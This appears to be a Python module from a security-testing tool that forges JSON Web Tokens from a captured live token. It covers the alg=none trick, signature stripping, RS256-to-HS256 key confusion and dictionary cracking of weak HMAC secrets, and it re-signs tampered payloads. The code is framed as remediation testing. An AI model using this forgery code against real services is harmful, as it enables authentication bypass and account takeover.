"""
PURE JWT forgery derivations for the broken-authentication class.

Given a genuine bearer token captured from a live session, this module derives a
FORGED token per strategy. It is pure and offline — it mints tokens, it never
sends them; the live probe (see :mod:`.run`) does that, and the deterministic
:func:`.judge.judge_broken_auth` decides whether the target accepted a forgery.

Two strategies are **guard-provable** — a gateway shape-guard (the `jwt`
:class:`RequestGuardRule` family) can refuse them by SHAPE, so they earn a full
find→patch→PROVE:

  alg_none   re-header the token with ``alg="none"`` and an empty signature — the
             classic "the server trusts the alg header" flaw.
  unsigned   strip the signature to a two-part ``header.payload`` token.

Two strategies produce a **validly-signed** forgery that is indistinguishable
from a genuine token at the gateway, so their remediation is honestly advisory
(the durable fix is handler-side: pin algorithms + verify the signature):

  hs256_confusion  sign ``alg="HS256"`` with the RSA *public* key as the HMAC
                   secret (the RS256→HS256 confusion attack).
  weak_secret      brute a bounded dictionary; if a candidate verifies the
                   genuine signature, re-sign a tampered payload with it.

Every forged payload carries a benign, unforgeable ``sentinel_forge`` marker
claim, so acceptance proves the server validated a token WE minted rather than
merely echoing the original.
"""

from __future__ import annotations

from dataclasses import dataclass
import base64
import hashlib
import hmac
import json

@dataclass(frozen=True)
class JwtParts:
    """The decoded pieces of a genuine JWT (raw segments preserved)."""

    header: dict
    payload: dict
    header_seg: str
    payload_seg: str
    signature_seg: str

    @property
    def signing_input(self) -> bytes:
        return f"{self.header_seg}.{self.payload_seg}".encode("ascii")


@dataclass(frozen=True)
class ForgeResult:
    """The outcome of one forgery derivation."""

    strategy: str
    token: str | None            # None when the forgery could not be derived
    guard_provable: bool         # can a shape-guard block it? (alg=none/unsigned)
    cracked_secret: str | None = None
    note: str = ""


def strip_bearer(value: str) -> str:
    """Return the bare token from a possible ``Bearer <token>`` wrapper."""
    token = (value or "").strip()
    if token.lower().startswith("bearer "):
        token = token[7:].strip()
    return token


def _b64url_decode(segment: str) -> bytes:
    pad = "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment + pad)


def _b64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def _encode_segment(obj: dict) -> str:
    raw = json.dumps(obj, separators=(",", ":"), sort_keys=True).encode("utf-8")
    return _b64url_encode(raw)


def decode_jwt(token: str) -> JwtParts | None:
    """Pure: decode a compact JWS into its parts, or None if not JWT-shaped."""
    bare = strip_bearer(token)
    parts = bare.split(".")
    if len(parts) < 2:
        return None
    header_seg, payload_seg = parts[0], parts[1]
    signature_seg = parts[2] if len(parts) >= 3 else ""
    try:
        header = json.loads(_b64url_decode(header_seg).decode("utf-8", "replace"))
        payload = json.loads(_b64url_decode(payload_seg).decode("utf-8", "replace"))
    except (ValueError, TypeError):
        return None
    if not isinstance(header, dict) or not isinstance(payload, dict):
        return None
    return JwtParts(
        header=header,
        payload=payload,
        header_seg=header_seg,
        payload_seg=payload_seg,
        signature_seg=signature_seg,
    )

def _marked_payload(payload: dict, marker: str) -> dict:
    """Return the payload with a benign, unforgeable forgery marker claim."""
    marked = dict(payload)
    marked["sentinel_forge"] = marker
    return marked


def _forge_alg_none(parts: JwtParts, marker: str) -> str:
    header = dict(parts.header)
    header["alg"] = "none"
    payload_seg = _encode_segment(_marked_payload(parts.payload, marker))
    # alg=none tokens carry an EMPTY signature but keep the trailing dot.
    return f"{_encode_segment(header)}.{payload_seg}."


def _forge_unsigned(parts: JwtParts, marker: str) -> str:
    # Preserve the declared algorithm but drop the signature entirely: a
    # two-part token the shape-guard recognises as missing its signature.
    header = dict(parts.header)
    payload_seg = _encode_segment(_marked_payload(parts.payload, marker))
    return f"{_encode_segment(header)}.{payload_seg}"


def _hmac_sign(header: dict, payload: dict, secret: bytes) -> str:
    header_seg = _encode_segment(header)
    payload_seg = _encode_segment(payload)
    signing_input = f"{header_seg}.{payload_seg}".encode("ascii")
    signature = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return f"{header_seg}.{payload_seg}.{_b64url_encode(signature)}"


def _forge_hs256_confusion(
    parts: JwtParts, public_key: str, marker: str
) -> str | None:
    if not public_key.strip():
        return None
    header = dict(parts.header)
    header["alg"] = "HS256"
    payload = _marked_payload(parts.payload, marker)
    # RS256→HS256 confusion: use the RSA PUBLIC key bytes as the HMAC secret.
    return _hmac_sign(header, payload, public_key.encode("utf-8"))


def _crack_weak_secret(parts: JwtParts, candidates) -> str | None:
    """Return the first dictionary secret that verifies the genuine signature."""
    alg = str(parts.header.get("alg", "")).upper()
    if alg != "HS256" or not parts.signature_seg:
        return None
    try:
        genuine_sig = _b64url_decode(parts.signature_seg)
    except (ValueError, TypeError):
        return None
    for candidate in candidates:
        computed = hmac.new(
            candidate.encode("utf-8"), parts.signing_input, hashlib.sha256
        ).digest()
        if hmac.compare_digest(computed, genuine_sig):
            return candidate
    return None


def _forge_weak_secret(
    parts: JwtParts, candidates, marker: str
) -> tuple[str | None, str | None]:
    secret = _crack_weak_secret(parts, candidates)
    if secret is None:
        return None, None
    header = dict(parts.header)
    header["alg"] = "HS256"
    payload = _marked_payload(parts.payload, marker)
    return _hmac_sign(header, payload, secret.encode("utf-8")), secret

def derive_forgery(
    genuine_token: str,
    strategy: str,
    *,
    public_key: str = "",
    secret_candidates=(),
    marker: str = "sentinel",
) -> ForgeResult:
    """
    Derive a forged token from `genuine_token` per `strategy`.

    Returns a :class:`ForgeResult` whose ``token`` is None when the forgery is
    not derivable (a non-JWT input, missing material, or a strong secret no
    candidate cracks) — the caller then seeds no probe, so nothing is claimed.
    """
    guard_provable = strategy in ("alg_none", "unsigned")
    parts = decode_jwt(genuine_token)
    if parts is None:
        return ForgeResult(
            strategy=strategy,
            token=None,
            guard_provable=guard_provable,
            note="the captured token is not a JWT — no forgery derivable",
        )

    if strategy == "alg_none":
        return ForgeResult(
            strategy, _forge_alg_none(parts, marker), True,
            note="re-headered alg=none with an empty signature",
        )
    if strategy == "unsigned":
        return ForgeResult(
            strategy, _forge_unsigned(parts, marker), True,
            note="signature stripped to a two-part token",
        )
    if strategy == "hs256_confusion":
        token = _forge_hs256_confusion(parts, public_key, marker)
        return ForgeResult(
            strategy, token, False,
            note=(
                "HS256 signed with the RSA public key as HMAC secret"
                if token is not None
                else "no public_key material supplied — cannot derive"
            ),
        )
    if strategy == "weak_secret":
        token, secret = _forge_weak_secret(parts, secret_candidates, marker)
        return ForgeResult(
            strategy, token, False, cracked_secret=secret,
            note=(
                f"HMAC secret cracked from the bounded dictionary ({len(tuple(secret_candidates))} "
                "candidates)"
                if token is not None
                else "no candidate secret verified the signature — no false claim"
            ),
        )
    return ForgeResult(
        strategy, None, guard_provable, note=f"unknown strategy {strategy!r}"
    )



